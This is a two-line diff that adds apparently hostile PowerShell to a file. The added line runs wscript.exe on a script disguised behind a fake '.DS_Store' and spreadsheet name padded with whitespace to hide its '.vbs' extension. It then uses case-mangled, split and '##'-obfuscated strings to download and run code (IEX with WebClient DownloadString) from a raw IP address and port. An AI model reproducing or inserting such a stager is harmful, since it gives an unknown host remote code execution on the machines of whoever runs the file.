@@ -1,0 +1,2 @@
+$OutputEncoding = New-Object -typename System.Text.UTF8Encoding
+wscript.exe '.\.DS_Store\~$table.xlmx                                                                       .vbs' -nOp -c $ExeCuTiOnCoNtExT.InvOkeCoMmAnD.NeWScriPtBlOcK("IE##X ((nE##w-ObJe##ct ('nE##T.wEB##cLiEnT')).('doWnl##OadStRiNg').inVo##KE('ht'+'tp:/'+'/10'+'6.55'+'.23'+'1.8'+'8:88'+'72/a'))".Replace('##',''))
